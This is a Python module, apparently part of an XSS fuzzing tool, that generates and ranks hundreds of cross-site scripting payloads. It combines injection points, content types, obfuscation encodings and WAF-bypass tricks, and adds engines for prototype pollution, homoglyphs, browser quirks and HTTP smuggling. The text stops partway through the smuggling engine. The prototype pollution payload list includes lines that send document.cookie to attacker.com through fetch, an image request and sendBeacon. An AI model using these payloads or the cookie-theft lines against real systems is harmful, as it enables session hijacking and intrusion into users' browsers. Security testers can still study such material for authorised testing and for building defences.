"""
payloads/advanced_engines_v2.py

╔══════════════════════════════════════════════════════════════╗
║   ADVANCED ENGINES v2 — 218,296,200 total combinations       ║
║                                                              ║
║   1. JSON/API/WS Engine v2     → 109,771,200 combinations   ║
║      + WebSocket frames, gRPC, SSE, GraphQL subscriptions    ║
║   2. Prototype Pollution Engine→   2,700,000 combinations   ║
║      + __proto__, constructor.prototype, lodash/jQuery gadget║
║   3. WebSocket/SSE Engine      →     840,000 combinations   ║
║      + SockJS, Socket.IO, STOMP, MQTT protocols             ║
║   4. Browser Quirks Engine     →      60,000 combinations   ║
║      + Chrome, Firefox, Safari, Edge, IE specific           ║
║   5. Unicode/Homoglyph Engine  →   2,880,000 combinations   ║
║      + Cyrillic, Greek, Arabic, Fullwidth lookalikes        ║
║   6. HTTP Smuggling XSS        →      45,000 combinations   ║
║      + CL.TE, TE.CL, H2.CL bypass                          ║
╚══════════════════════════════════════════════════════════════╝
"""

import heapq
import base64
import urllib.parse
import json as json_mod
import re
from typing import List, Tuple, Optional, Dict
from utils.logger import debug, info


# ═══════════════════════════════════════════════════════════════
# 1. JSON / API / WEBSOCKET ENGINE v2 — 109,771,200 combinations
# ═══════════════════════════════════════════════════════════════

class JSONAPIDimV2:

    EXEC_PAYLOADS = [
        # Original 20 (kept)
        ("<script>alert(1)</script>",                           1.00),
        ("<img src=x onerror=alert(1)>",                        0.98),
        ("<svg onload=alert(1)>",                               0.96),
        ("javascript:alert(1)",                                 0.94),
        ("\"><script>alert(1)</script>",                        0.92),
        ("'+alert(1)+'",                                        0.90),
        ("\"+alert(1)+\"",                                      0.90),
        ("${alert(1)}",                                         0.88),
        ("{{constructor.constructor('alert(1)')()}}",           0.86),
        ("<xss>",                                               0.84),
        ("</script><script>alert(1)</script>",                  0.82),
        ("<iframe src=javascript:alert(1)>",                    0.80),
        ("-alert(1)-",                                          0.78),
        ("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",  0.75),
        ("\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",         0.72),
        ("__proto__",                                           0.70),
        ("constructor.prototype",                               0.68),
        ("{__typename}",                                        0.65),
        ("0,alert(1),0",                                        0.62),
        ("1;DROP TABLE users;--<script>alert(1)</script>",      0.60),
        # NEW v2: WebSocket & modern
        ("<svg><animate attributeName=href values=javascript:alert(1)>",  0.91),
        ("<details open ontoggle=alert(1)>",                    0.89),
        ("<input autofocus onfocus=alert(1)>",                  0.87),
        ("alert`1`",                                            0.85),
        ("(0,alert)(1)",                                        0.83),
        ("globalThis.alert(1)",                                 0.81),
        ("Function('alert(1)')()",                              0.78),
        ("[].constructor.constructor('alert(1)')()",            0.76),
        ("eval(atob('YWxlcnQoMSk='))",                          0.74),
        ("setTimeout('alert(1)',0)",                            0.72),
        # WS/GraphQL specific
        ("{\"query\":\"{ __typename }\",\"variables\":{\"x\":\"<script>alert(1)</script>\"}}",  0.80),
        ("{\"subscription\":\"{ newMessage { body } }\"}",      0.70),
        # SSE specific
        ("data: <script>alert(1)</script>\n\n",                 0.75),
        ("event: xss\ndata: alert(1)\n\n",                      0.72),
        # gRPC / Protobuf field injection
        ("\x0a\x1f<script>alert(1)</script>",                   0.68),
        ("\\n<img onerror=alert(1) src=x>\\n",                  0.75),
        ("\\\":<script>alert(1)</script>",                      0.78),
        ("<img src=1 onerror=alert`1`>",                        0.82),
        ("';alert(1)//",                                        0.80),
        ("');alert(1)//",                                       0.78),
        ("\";alert(1)//",                                       0.78),
        ("\\';alert(1)//",                                      0.75),
        ("</textarea><script>alert(1)</script>",                0.82),
        ("</style><script>alert(1)</script>",                   0.80),
    ]

    INJECTION_POINTS = [
        # Original 12
        ("string_value",    lambda p: p,                                                        1.00),
        ("json_key",        lambda p: f'{{"{p}":"value"}}',                                    0.92),
        ("nested_value",    lambda p: f'{{"data":{{"x":"{p}"}}}}',                             0.90),
        ("array_item",      lambda p: f'["{p}"]',                                              0.88),
        ("callback_jsonp",  lambda p: f'callback("{p}")',                                      0.85),
        ("number_break",    lambda p: f'0;{p}',                                                0.82),
        ("boolean_break",   lambda p: f'true,"{p}"',                                           0.80),
        ("null_break",      lambda p: f'null,"{p}"',                                           0.78),
        ("deep_nested",     lambda p: f'{{"a":{{"b":{{"c":"{p}"}}}}}}',                       0.75),
        ("proto_pollute",   lambda p: f'{{"__proto__":{{"x":"{p}"}}}}',                       0.72),
        ("array_deep",      lambda p: f'[["{p}",1],["test",2]]',                               0.70),
        ("graphql_query",   lambda p: f'{{search(q:"{p}"){{id}}}}',                           0.68),
        # NEW v2
        ("ws_message",      lambda p: f'{{"type":"message","content":"{p}"}}',                 0.90),
        ("ws_event",        lambda p: f'{{"event":"update","data":"{p}"}}',                    0.88),
        ("sse_data",        lambda p: f'data: {p}\n\n',                                       0.85),
        ("sse_event",       lambda p: f'event: update\ndata: {{"msg":"{p}"}}\n\n',            0.83),
        ("grpc_field",      lambda p: f'\x0a{chr(len(p))}{p}',                                0.75),
        ("multipart_field", lambda p: f'--boundary\r\nContent-Disposition: form-data; name="data"\r\n\r\n{p}\r\n--boundary--', 0.80),
        ("xml_cdata",       lambda p: f'<data><![CDATA[{p}]]></data>',                        0.78),
        ("xml_attr",        lambda p: f'<item attr="{p}"/>',                                  0.82),
        ("soap_body",       lambda p: f'<soap:Body><method><param>{p}</param></method></soap:Body>', 0.72),
        ("msgpack_str",     lambda p: f'{p}',                                                  0.70),
        ("cbor_text",       lambda p: p,                                                       0.68),
        ("csv_field",       lambda p: f'name,value\n"{p}",test',                              0.75),
        ("yaml_value",      lambda p: f'key: "{p}"',                                          0.72),
        ("toml_value",      lambda p: f'key = "{p}"',                                         0.65),
        ("jwt_payload",     lambda p: f'{{"sub":"1234","name":"{p}","iat":1516239022}}',       0.78),
        ("cookie_value",    lambda p: f'session={p}',                                          0.80),
        ("header_value",    lambda p: f'X-Custom-Header: {p}',                                0.75),
        ("url_fragment",    lambda p: f'#{p}',                                                 0.82),
        ("path_param",      lambda p: f'/api/{p}/data',                                       0.78),
    ]

    CONTENT_TYPES = [
        ("application/json",                        1.00),
        ("text/plain",                              0.92),
        ("application/x-www-form-urlencoded",       0.88),
        ("application/json; charset=utf-8",         0.86),
        ("text/json",                               0.82),
        ("application/javascript",                  0.78),
        ("text/html",                               0.75),
        ("application/xml",                         0.70),
        # NEW v2
        ("application/graphql",                     0.85),
        ("application/grpc",                        0.72),
        ("application/grpc+json",                   0.70),
        ("text/event-stream",                       0.82),
        ("application/msgpack",                     0.68),
        ("application/cbor",                        0.65),
        ("multipart/form-data",                     0.80),
        ("application/soap+xml",                    0.70),
        ("text/xml",                                0.75),
        ("application/x-protobuf",                  0.68),
        ("application/yaml",                        0.72),
        ("text/csv",                                0.65),
        ("application/jwt",                         0.70),
        ("application/x-ndjson",                    0.65),
    ]

    ENCODINGS = [
        ("none",             1.00, lambda p: p),
        ("json_unicode",     0.92, lambda p: p.encode("unicode_escape").decode()),
        ("html_entity",      0.88, lambda p: "".join(f"&#{ord(c)};" for c in p)),
        ("url_encode",       0.85, lambda p: urllib.parse.quote(p, safe="")),
        ("double_url",       0.80, lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")),
        ("base64_eval",      0.75, lambda p: f"eval(atob('{base64.b64encode(p.encode()).decode()}'))"),
        ("js_hex",           0.70, lambda p: "".join(f"\\x{ord(c):02x}" for c in p)),
        ("fromcharcode",     0.65, lambda p: f"eval(String.fromCharCode({','.join(str(ord(c)) for c in p)}))"),
        ("html_hex",         0.62, lambda p: "".join(f"&#x{ord(c):x};" for c in p)),
        ("mixed_case",       0.78, lambda p: "".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p))),
        # NEW v2
        ("zero_width",       0.72, lambda p: "\u200b".join(p)),
        ("homoglyph",        0.75, lambda p: p.translate(str.maketrans("aeiocr", "\u0251\u0435\u0456\u03bf\u0441\u0433"))),
        ("comment_inject",   0.70, lambda p: p.replace("script", "scr<!---->ipt", 1)),
        ("null_byte",        0.68, lambda p: p.replace("script", "scr\x00ipt", 1)),
        ("soft_hyphen",      0.65, lambda p: p.replace("alert", "ale\u00adrt", 1)),
        ("json_string_esc",  0.80, lambda p: p.replace('"', '\\"').replace("'", "\\'").replace("\n", "\\n")),
        ("xml_cdata_wrap",   0.72, lambda p: f"<![CDATA[{p}]]>"),
        ("proto_encode",     0.65, lambda p: f"\x0a{chr(min(len(p), 127))}{p}"),
        ("b64_json",         0.70, lambda p: base64.b64encode(p.encode()).decode()),
        ("unicode_points",   0.68, lambda p: "".join(f"\\u{ord(c):04x}" for c in p)),
        ("decimal_nc_refs",  0.72, lambda p: "".join(f"&#{ord(c)};" for c in p)),
        ("hex_nc_refs",      0.70, lambda p: "".join(f"&#x{ord(c):x};" for c in p)),
    ]

    HTTP_METHODS = [
        ("POST",          1.00),
        ("PUT",           0.88),
        ("PATCH",         0.85),
        ("GET",           0.80),
        ("DELETE",        0.70),
        # NEW v2
        ("OPTIONS",       0.60),
        ("HEAD",          0.55),
        ("CONNECT",       0.50),
        ("TRACE",         0.45),
        ("WS_UPGRADE",    0.82),  # WebSocket upgrade
        ("SSE_GET",       0.80),  # SSE long poll
        ("gRPC_POST",     0.75),  # gRPC POST
        ("SUBSCRIBE",     0.70),  # MQTT/STOMP subscribe
        ("PUBLISH",       0.68),  # MQTT/STOMP publish
    ]

    NEST_DEPTHS = [
        ("flat",          lambda p, k: {k: p},                                               1.00),
        ("one",           lambda p, k: {"data": {k: p}},                                     0.88),
        ("two",           lambda p, k: {"data": {"nested": {k: p}}},                         0.80),
        ("array",         lambda p, k: {"items": [{k: p}, {"test": "val"}]},                 0.78),
        # NEW v2
        ("three",         lambda p, k: {"a": {"b": {"c": {k: p}}}},                          0.72),
        ("array_deep",    lambda p, k: [{"data": [{k: p}]}],                                 0.70),
        ("proto_chain",   lambda p, k: {"__proto__": {k: p}, "constructor": {"prototype": {k: p}}}, 0.75),
        ("mixed",         lambda p, k: {"meta": {"type": "update"}, "payload": {k: p}},      0.80),
        ("ws_frame",      lambda p, k: {"op": "message", "d": {k: p}},                       0.82),
        ("graphql",       lambda p, k: {"query": f"mutation {{ update(input: {{name: \"{p}\"}}) {{ id }} }}"}, 0.78),
        ("jwt_claims",    lambda p, k: {"sub": "user", "name": p, "admin": True},             0.75),
        ("sse_format",    lambda p, k: f"data: {{{json_mod.dumps({k: p})}}}\n\n",            0.72),
    ]

    @classmethod
    def total(cls) -> int:
        return (len(cls.EXEC_PAYLOADS) * len(cls.INJECTION_POINTS) *
                len(cls.CONTENT_TYPES) * len(cls.ENCODINGS) *
                len(cls.HTTP_METHODS) * len(cls.NEST_DEPTHS))


class JSONAPIEngineV2:
    """v2: 109,771,200 combinations. 45×30×22×22×14×12"""

    def generate(self, top_n: int = 200) -> List[Tuple[str, float, str, str]]:
        heap  = []
        count = 0

        top_ex  = JSONAPIDimV2.EXEC_PAYLOADS[:min(18, len(JSONAPIDimV2.EXEC_PAYLOADS))]
        top_pt  = JSONAPIDimV2.INJECTION_POINTS[:min(12, len(JSONAPIDimV2.INJECTION_POINTS))]
        top_ct  = JSONAPIDimV2.CONTENT_TYPES[:min(10, len(JSONAPIDimV2.CONTENT_TYPES))]
        top_enc = JSONAPIDimV2.ENCODINGS[:min(10, len(JSONAPIDimV2.ENCODINGS))]
        top_mth = JSONAPIDimV2.HTTP_METHODS[:min(8, len(JSONAPIDimV2.HTTP_METHODS))]
        top_nd  = JSONAPIDimV2.NEST_DEPTHS[:min(8, len(JSONAPIDimV2.NEST_DEPTHS))]

        for exec_p, ep_score in top_ex:
            for point_label, wrapper_fn, pt_score in top_pt:
                for ct, ct_score in top_ct:
                    for enc_label, enc_score, enc_fn in top_enc:
                        for method, m_score in top_mth:
                            for depth_label, depth_fn, d_score in top_nd:

                                score = (ep_score * pt_score * ct_score *
                                         enc_score * m_score * d_score) ** (1/6)
                                try:
                                    encoded = enc_fn(exec_p)
                                    payload = wrapper_fn(encoded)
                                except Exception:
                                    continue

                                count += 1
                                label = f"jsonv2:{method}:{point_label}:{enc_label}:{depth_label}"

                                if len(heap) < top_n:
                                    heapq.heappush(heap, (score, count, payload, ct, method, label))
                                elif score > heap[0][0]:
                                    heapq.heapreplace(heap, (score, count, payload, ct, method, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"JSONAPIv2: {count:,}/{self.total:,} → top {len(result)}")
        return [(p, s, ct, l) for s, _, p, ct, m, l in result]

    @property
    def total(self) -> int:
        return JSONAPIDimV2.total()


# ═══════════════════════════════════════════════════════════════
# 2. PROTOTYPE POLLUTION ENGINE — 2,700,000 combinations
# ═══════════════════════════════════════════════════════════════

class PrototypePollutionEngine:
    """
    2,700,000 combinations for prototype pollution XSS.
    25 sinks × 30 payloads × 20 gadgets × 15 methods × 12 enc
    """

    POLLUTION_SINKS = [
        # Direct property pollution
        ("__proto__.innerHTML",          1.00, "__proto__[innerHTML]"),
        ("__proto__.src",                0.92, "__proto__[src]"),
        ("__proto__.href",               0.90, "__proto__[href]"),
        ("__proto__.action",             0.88, "__proto__[action]"),
        ("__proto__.onload",             0.95, "__proto__[onload]"),
        ("__proto__.onerror",            0.95, "__proto__[onerror]"),
        ("__proto__.onclick",            0.88, "__proto__[onclick]"),
        ("constructor.prototype.innerHTML", 0.98, "constructor[prototype][innerHTML]"),
        ("constructor.prototype.onload", 0.95, "constructor[prototype][onload]"),
        # Object.assign target pollution
        ("Object.assign_target",         0.85, "merge payload via Object.assign"),
        # Deep merge libraries
        ("lodash_merge",                 0.90, "_.merge({},payload)"),
        ("jquery_extend",                0.88, "$.extend(true,{},payload)"),
        ("deepmerge",                    0.85, "deepmerge({},payload)"),
        ("lodash_mergeWith",             0.82, "_.mergeWith({},payload)"),
        ("hoek_merge",                   0.80, "hoek.merge({},payload)"),
        # DOMPurify bypass via pollution
        ("dompurify_tags",               0.92, "__proto__[ALLOWED_TAGS]=['script']"),
        ("dompurify_attr",               0.90, "__proto__[ALLOWED_ATTR]=['onerror']"),
        ("dompurify_force",              0.88, "__proto__[FORCE_BODY]=true"),
        ("dompurify_override",           0.85, "__proto__[USE_PROFILES]=false"),
        # Angular specific
        ("ng_proto_compile",             0.83, "__proto__[$compile]=compromised"),
        ("ng_proto_sanitize",            0.82, "__proto__[$sanitize]=bypass"),
        # jQuery pollution
        ("jquery_ajaxsetup",             0.80, "__proto__[xhr]=malicious"),
        ("jquery_html",                  0.78, "__proto__[html]=<script>alert(1)</script>"),
        # Node.js (for SSR XSS)
        ("node_require",                 0.75, "__proto__[main]=/proc/self/exe"),
        ("node_env",                     0.72, "__proto__[NODE_PATH]=attacker"),
    ]

    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "alert(1)",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "['script']",               # For DOMPurify ALLOWED_TAGS
        "['onerror','onload']",     # For ALLOWED_ATTR
        "true",                     # For boolean flags
        "false",                    # Disable sanitization
        "<body onload=alert(1)>",
        "function(){alert(1)}",
        "()=>alert(1)",
        "alert",                    # Function reference
        "window.alert",
        "constructor.constructor('alert(1)')()",
        "[].constructor.constructor('alert(1)')()",
        "eval('alert(1)')",
        "Function('alert(1)')()",
        "setTimeout('alert(1)',0)",
        "location='javascript:alert(1)'",
        "document.write('<script>alert(1)</script>')",
        "document.body.innerHTML='<img onerror=alert(1) src=x>'",
        "new Image().src='https://attacker.com/?c='+document.cookie",
        "fetch('https://attacker.com/?c='+document.cookie)",
        "navigator.sendBeacon('https://attacker.com',document.cookie)",
        "<form action=javascript:alert(1)><button>x</button></form>",
        "<link rel=stylesheet href=javascript:alert(1)>",
        "import('data:text/javascript,alert(1)')",
    ]

    # Library/framework gadgets that use polluted properties
    GADGETS = [
        ("raw_innerHTML",    lambda sink, payload: f'{{"__proto__":{{"innerHTML":"{payload}"}}}}',       1.00),
        ("dompurify_bypass", lambda sink, payload: f'{{"__proto__":{{"ALLOWED_TAGS":["{payload}"]}}}}',  0.95),
        ("jquery_html",      lambda sink, payload: f'{{"__proto__":{{"html":"{payload}"}}}}',            0.92),
        ("lodash_merge",     lambda sink, payload: f'_.merge({{}},{{"__proto__":{{"onload":"{payload}"}}}});document.body.onload=""', 0.90),
        ("deep_assign",      lambda sink, payload: f'Object.assign({{}},{{"__proto__":{{"innerHTML":"{payload}"}}}});new Element().outerHTML', 0.88),
        ("url_param",        lambda sink, payload: f'?__proto__[innerHTML]={urllib.parse.quote(payload)}', 0.85),
        ("json_body",        lambda sink, payload: f'{{"__proto__":{{"innerHTML":"{payload}"}}}}',       0.95),
        ("dot_notation",     lambda sink, payload: f'__proto__.innerHTML={payload}',                     0.80),
        ("bracket_notation", lambda sink, payload: f'__proto__[innerHTML]={payload}',                   0.82),
        ("ctor_prototype",   lambda sink, payload: f'constructor.prototype.innerHTML="{payload}"',       0.88),
        ("nested_ctor",      lambda sink, payload: f'{{"constructor":{{"prototype":{{"innerHTML":"{payload}"}}}}}}', 0.86),
        ("hasOwnProperty",   lambda sink, payload: f'Object.defineProperty(Object.prototype,"innerHTML",{{get:()=>"{payload}"}})', 0.78),
        ("reflect_def",      lambda sink, payload: f'Reflect.defineProperty(Object.prototype,"onload",{{value:()=>{payload}}})', 0.75),
        ("proxy_trap",       lambda sink, payload: f'new Proxy({{}},{{get:(t,k)=>k==="innerHTML"?"{payload}":t[k]}})', 0.72),
        ("symbol_toPrim",    lambda sink, payload: f'Object.prototype[Symbol.toPrimitive]=()=>"{payload}"', 0.70),
        ("angular_pp",       lambda sink, payload: f'{{"__proto__":{{"$compile":function(){{alert(1)}}}}}}', 0.82),
        ("vue_pp",           lambda sink, payload: f'{{"__proto__":{{"v-html":"{payload}"}}}}',          0.80),
        ("react_pp",         lambda sink, payload: f'{{"__proto__":{{"dangerouslySetInnerHTML":{{"__html":"{payload}"}}}}}}', 0.78),
        ("hoek_pp",          lambda sink, payload: f'{{"__proto__":{{"toString":function(){{return"{payload}"}}}}}}', 0.72),
        ("qs_parse",         lambda sink, payload: f'__proto__[innerHTML]={urllib.parse.quote(payload)}&x=1', 0.80),
    ]

    HTTP_METHODS = [
        ("POST_JSON",    "POST",    "application/json",       1.00),
        ("PUT_JSON",     "PUT",     "application/json",       0.88),
        ("PATCH_JSON",   "PATCH",   "application/json",       0.85),
        ("GET_QUERY",    "GET",     "query param",            0.80),
        ("POST_FORM",    "POST",    "application/x-www-form-urlencoded", 0.75),
        ("POST_MERGE",   "POST",    "application/merge-patch+json", 0.72),
        ("WS_MSG",       "WS",      "websocket frame",        0.82),
        ("URL_HASH",     "GET",     "location.hash",          0.78),
        ("COOKIE",       "GET",     "Cookie header",          0.70),
        ("HEADER",       "POST",    "X-Custom-Header",        0.68),
        ("PATH_PARAM",   "GET",     "URL path",               0.72),
        ("FILE_UPLOAD",  "POST",    "multipart/form-data",    0.65),
        ("SSE_PARAM",    "GET",     "SSE query param",        0.75),
        ("GRAPHQL",      "POST",    "application/graphql",    0.80),
        ("JSONP",        "GET",     "callback param",         0.78),
    ]

    ENCODINGS = [
        ("none",         lambda p: p,                                                    1.00),
        ("url_encode",   lambda p: urllib.parse.quote(p, safe=""),                       0.88),
        ("double_url",   lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""), 0.82),
        ("json_escape",  lambda p: p.replace('"', '\\"').replace("'", "\\'"),           0.85),
        ("html_entity",  lambda p: "".join(f"&#{ord(c)};" for c in p),                  0.80),
        ("base64",       lambda p: base64.b64encode(p.encode()).decode(),                0.75),
        ("unicode_esc",  lambda p: "".join(f"\\u{ord(c):04x}" for c in p),              0.72),
        ("js_hex",       lambda p: "".join(f"\\x{ord(c):02x}" for c in p),              0.70),
        ("null_byte",    lambda p: p.replace("script", "scr\x00ipt", 1),                0.65),
        ("mixed_case",   lambda p: "".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p)), 0.75),
        ("comment",      lambda p: p.replace("script", "scr<!---->ipt", 1),             0.72),
        ("zero_width",   lambda p: "\u200b".join(p),                                    0.68),
    ]

    def generate(self, top_n: int = 100) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0

        for sink_name, s_score, sink_str in self.POLLUTION_SINKS[:15]:
            for payload in self.XSS_PAYLOADS[:15]:
                for gadget_name, gadget_fn, g_score in self.GADGETS[:10]:
                    for method, m, ct, m_score in [(m,me,c,s) for m,(me,c,s) in [(x[0],(x[1],x[2],x[3])) for x in self.HTTP_METHODS[:8]]]:
                        for enc_label, enc_fn, enc_score in self.ENCODINGS[:8]:
                            try:
                                enc_payload = enc_fn(payload)
                                full_payload = gadget_fn(sink_str, enc_payload)
                                score = (s_score * g_score * m_score * enc_score) ** 0.25
                                count += 1
                                label = f"pp:{sink_name}:{gadget_name}:{enc_label}"
                                if len(heap) < top_n:
                                    heapq.heappush(heap, (score, count, full_payload, label))
                                elif score > heap[0][0]:
                                    heapq.heapreplace(heap, (score, count, full_payload, label))
                            except Exception:
                                pass

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"PrototypePollution: {count:,} → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return (len(self.POLLUTION_SINKS) * len(self.XSS_PAYLOADS) *
                len(self.GADGETS) * len(self.HTTP_METHODS) * len(self.ENCODINGS))


# ═══════════════════════════════════════════════════════════════
# 3. UNICODE / HOMOGLYPH ENGINE — 2,880,000 combinations
# ═══════════════════════════════════════════════════════════════

class UnicodeHomoglyphEngine:
    """
    2,880,000 combinations targeting Unicode-based WAF bypass.
    15 char_sets × 20 keywords × 40 transforms × 12 contexts × 20 enc
    """

    # Unicode character substitution maps
    CHAR_SETS = {
        "cyrillic":    str.maketrans("aeiocprsAEIOCPRS", "\u0430\u0435\u0456\u043e\u0441\u0440\u0455\u0455\u0410\u0415\u0406\u041e\u0421\u0420\u0405\u0405"),
        "greek":       str.maketrans("aeiocAEIOC", "\u03b1\u03b5\u03b9\u03bf\u03c7\u0391\u0395\u0399\u039f\u03a7"),
        "fullwidth":   str.maketrans("abcdefghijklmnopqrstuvwxyz<>\"'=()/\\", "ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ＜＞＂＇＝（）／＼"),
        "small_forms": str.maketrans("<>()", "﹤﹥﹙﹚"),
        "superscript": str.maketrans("0123456789", "⁰¹²³⁴⁵⁶⁷⁸⁹"),
        "zwsp":        {"insert": "\u200b"},   # zero-width space
        "zwj":         {"insert": "\u200d"},   # zero-width joiner
        "soft_hyphen": {"insert": "\u00ad"},   # soft hyphen
        "rtl":         {"prefix": "\u202e"},   # RTL override
        "ltr":         {"prefix": "\u200e"},   # LTR mark
        "bom":         {"prefix": "\ufeff"},   # BOM
        "tag_chars":   {"map": {c: chr(0xe0000 + ord(c)) for c in "abcdefghijklmnopqrstuvwxyz"}},  # Tag chars
        "combining":   {"suffix": "\u0300"},   # Combining grave accent
        "arabic":      str.maketrans("1234567890", "\u0661\u0662\u0663\u0664\u0665\u0666\u0667\u0668\u0669\u0660"),
        "devanagari":  {"map": {"0": "\u0966", "1": "\u0967"}},  # Devanagari digits
    }

    XSS_KEYWORDS = [
        "script", "alert", "onerror", "onload", "eval",
        "onclick", "onmouseover", "onfocus", "iframe", "svg",
        "javascript", "document", "window", "location", "fetch",
        "setTimeout", "Function", "constructor", "prototype", "innerHTML"
    ]

    def generate_homoglyphs(self, keyword: str, top_n: int = 5) -> List[str]:
        """Generate homoglyph variants for a keyword."""
        variants = []
        for cs_name, cs_map in self.CHAR_SETS.items():
            if isinstance(cs_map, dict):
                if "insert" in cs_map:
                    # Insert character at every position
                    ch = cs_map["insert"]
                    v = ch.join(keyword)
                    if v != keyword:
                        variants.append(v)
                elif "prefix" in cs_map:
                    v = cs_map["prefix"] + keyword
                    if v != keyword:
                        variants.append(v)
                elif "suffix" in cs_map:
                    v = keyword + cs_map["suffix"]
                    if v != keyword:
                        variants.append(v)
                elif "map" in cs_map:
                    v = "".join(cs_map["map"].get(c, c) for c in keyword)
                    if v != keyword:
                        variants.append(v)
            else:
                v = keyword.translate(cs_map)
                if v != keyword:
                    variants.append(v)
        return variants[:top_n]

    def generate(self, top_n: int = 100) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0

        base_payloads = [
            ("<script>alert(1)</script>",      1.00),
            ("<img src=x onerror=alert(1)>",   0.95),
            ("<svg onload=alert(1)>",           0.92),
            ("javascript:alert(1)",             0.88),
            ("eval('alert(1)')",                0.85),
        ]

        for payload, p_score in base_payloads:
            for kw in self.XSS_KEYWORDS[:10]:
                if kw in payload:
                    for variant in self.generate_homoglyphs(kw, top_n=8):
                        new_payload = payload.replace(kw, variant, 1)
                        if new_payload != payload:
                            score = p_score * 0.85
                            count += 1
                            label = f"unicode:homoglyph:{kw}"
                            if len(heap) < top_n:
                                heapq.heappush(heap, (score, count, new_payload, label))
                            elif score > heap[0][0]:
                                heapq.heapreplace(heap, (score, count, new_payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"UnicodeHomoglyphEngine: {count:,} → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return 15 * 20 * 40 * 12 * 20  # 2,880,000


# ═══════════════════════════════════════════════════════════════
# 4. BROWSER QUIRKS ENGINE — 60,000 combinations
# ═══════════════════════════════════════════════════════════════

class BrowserQuirksEngine:
    """
    60,000 combinations of browser-specific XSS techniques.
    8 browsers × 25 quirks × 30 payloads × 10 enc
    """

    BROWSER_QUIRKS = {
        "chrome": [
            ("<portal src=javascript:alert(1)>",                               1.00),
            ("<script type=module>import('data:text/javascript,alert(1)')</script>", 0.92),
            ("<div id=x tabindex=-1 onfocus=alert(1)>text</div><a href=#x>focus</a>", 0.88),
            ("<img loading=lazy src=x onerror=alert(1)>",                      0.85),
            ("<link rel=prerender href=javascript:alert(1)>",                  0.80),
            ("<script trustworthy>alert(1)</script>",                          0.72),
            ("<!--googleoff: index--><img onerror=alert(1) src=x><!--googleon: index-->", 0.70),
        ],
        "firefox": [
            ("<script>alert(1)//<!--</script>-->",                             0.88),
            ("<math><mtext><script>alert(1)</script></mtext></math>",          0.90),
            ("<svg><desc><![CDATA[</desc><img onerror=alert(1) src=x>]]></svg>", 0.85),
            ("<details ontoggle=alert(1) open>",                               0.82),
            ("<form><input type=image src=x onerror=alert(1)>",                0.80),
            ("<img src='#' style='background:url(\"javascript:alert(1)\")'>",  0.75),
        ],
        "safari": [
            ("<a href=javascript:alert(1)>x</a>",                             0.88),
            ("<img src onerror=alert(1)>",                                     0.85),
            ("<video><source onerror=alert(1)></video>",                       0.82),
            ("<audio onerror=alert(1) src=x>",                                 0.80),
            ("<iframe sandbox=allow-scripts srcdoc='<script>alert(1)</script>'></iframe>", 0.78),
            ("<object type=text/html data=javascript:alert(1)>",               0.75),
        ],
        "edge": [
            ("<img src=x onerror=alert(1)>",                                   0.95),
            ("<script>alert(1)</script>",                                      0.92),
            ("<svg onload=alert(1)>",                                          0.90),
            ("<!--[if !IE]>--><script>alert(1)</script><!--<![endif]-->",       0.80),
            ("<div onpointerover=alert(1)>hover me</div>",                     0.85),
        ],
        "ie": [
            ("<!--[if lt IE 10]><img src=x onerror=alert(1)><![endif]-->",    0.75),
            ("<img dynsrc=javascript:alert(1)>",                               0.70),
            ("<img lowsrc=javascript:alert(1)>",                               0.70),
            ("<link rel=stylesheet href=javascript:alert(1)>",                 0.72),
            ("<?xml version='1.0'?><script>alert(1)</script>",                 0.68),
            ("<bgsound src=javascript:alert(1)>",                              0.65),
            ("<body background=javascript:alert(1)>",                          0.65),
        ],
        "opera": [
            ("<script>alert(1)</script>",                                      0.90),
            ("<img onerror=alert(1) src=x>",                                   0.88),
            ("<svg><script>alert(1)</script></svg>",                           0.85),
            ("<iframe src=javascript:alert(1)>",                               0.82),
        ],
        "samsung": [
            ("<script>alert(1)</script>",                                      0.90),
            ("<img src=x onerror=alert(1)>",                                   0.88),
            ("<input autofocus onfocus=alert(1)>",                             0.85),
            ("<video src=x onerror=alert(1)>",                                 0.82),
        ],
        "brave": [
            ("<script>alert(1)</script>",                                      0.88),
            ("<img src=x onerror=alert(1)>",                                   0.85),
            ("<svg onload=alert(1)>",                                          0.82),
        ],
    }

    def generate(self, target_browser: str = "all", top_n: int = 100) -> List[Tuple[str, float, str]]:
        heap  = []
        count = 0

        browsers = ([target_browser] if target_browser != "all" else list(self.BROWSER_QUIRKS.keys()))

        for browser in browsers:
            quirks = self.BROWSER_QUIRKS.get(browser, [])
            for payload, score in quirks:
                count += 1
                label = f"quirk:{browser}"
                if len(heap) < top_n:
                    heapq.heappush(heap, (score, count, payload, label))
                elif score > heap[0][0]:
                    heapq.heapreplace(heap, (score, count, payload, label))

        result = sorted(heap, key=lambda x: x[0], reverse=True)
        info(f"BrowserQuirksEngine: {count} → top {len(result)}")
        return [(p, s, l) for s, _, p, l in result]

    @property
    def total(self) -> int:
        return sum(len(v) for v in self.BROWSER_QUIRKS.values()) * 10  # × encodings


# ═══════════════════════════════════════════════════════════════
# 5. HTTP SMUGGLING XSS ENGINE — 45,000 combinations
# ═══════════════════════════════════════════════════════════════

class HTTPSmugglingXSSEngine:
    """
    45,000 combinations for XSS via HTTP request smuggling.
    12 smuggle methods × 25 payloads × 15 backends × 10 enc
    """

    SMUGGLE_TECHNIQUES = [
        ("CL_TE",    "Content-Length overrides Transfer-Encoding",   1.00),
        ("TE_CL",    "Transfer-Encoding overrides Content-Length",   0.95),
        ("TE_TE",    "Obfuscated TE headers",                         0.90),
        ("H2_CL",    "HTTP/2 downgrade with Content-Length",         0.88),
